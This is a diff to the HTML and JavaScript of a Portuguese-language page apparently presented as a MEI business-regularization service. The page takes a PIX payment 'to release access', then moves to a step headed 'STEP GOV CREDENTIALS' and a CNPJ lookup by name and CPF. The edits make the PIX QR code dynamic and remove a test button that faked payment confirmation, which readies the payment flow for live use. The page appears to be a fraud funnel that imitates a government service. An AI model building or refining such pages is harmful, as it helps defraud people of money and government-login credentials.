@@ -1145,9 +1145,13 @@
                 <p class="desc">Para liberar o acesso ao sistema de regularização, realize o pagamento via PIX abaixo.</p>
                 
                 <div class="pix-box">
-                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-4266141740005204000053039865802BR5913MEI_EM_DIA_APP6009SAO_PAULO62070503***6304E2CA" alt="QR Code PIX" style="margin-bottom: 20px; border: 4px solid white; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
+                    <img id="pix-qr-img" src="" alt="QR Code PIX" style="display: none; margin: 0 auto 20px; border: 4px solid white; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
+                    <div id="qr-placeholder" style="padding: 40px 0;">
+                        <div class="loader-spinner"></div>
+                        <p style="font-size: 11px; color: var(--gold); margin-top: 10px;">Gerando QR Code Seguro...</p>
+                    </div>
                     <div class="pix-label">Chave PIX (Copia e Cola)</div>
-                    <div class="pix-key" id="pix-key-val">Carregando chave...</div>
+                    <div class="pix-key" id="pix-key-val">Processando...</div>
                     <button class="copy-btn" onclick="copyPix()">Copiar Código PIX</button>
                 </div>
 
@@ -1160,9 +1164,6 @@
                     <div class="loader-spinner" style="width: 20px; height: 20px;"></div>
                     <p style="font-size: 12px; color: var(--muted); margin-top: 10px;">Aguardando confirmação bancária...</p>
                 </div>
-
-                <!-- Botão de simulação para o usuário avançar manualmente no teste -->
-                <button class="btn-ghost" onclick="confirmPaymentSimulation()" style="border-style: dashed; margin-top: 20px;">[Simular Confirmação de Pagamento]</button>
             </section>
 
             <!-- ── STEP GOV CREDENTIALS ── -->
@@ -1663,7 +1664,12 @@
                 // Show real QR Code image if available
                 if (data.qr_code_base64) {
                     const img = document.getElementById('pix-qr-img');
-                    img.src = `data:image/png;base64,${data.qr_code_base64}`;
+                    // Check if it's already a full data URI or URL
+                    if (data.qr_code_base64.startsWith('http') || data.qr_code_base64.startsWith('data:')) {
+                        img.src = data.qr_code_base64;
+                    } else {
+                        img.src = `data:image/png;base64,${data.qr_code_base64}`;
+                    }
                     img.style.display = 'inline-block';
                     document.getElementById('qr-placeholder').style.display = 'none';
                 }
@@ -1970,7 +1976,7 @@
             resultsDiv.style.display = 'none';
 
             try {
-                const response = await fetch('http://localhost:8000/api/v1/buscar-cnpj', {
+                const response = await fetch('/api/v1/buscar-cnpj', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ nome, cpf })
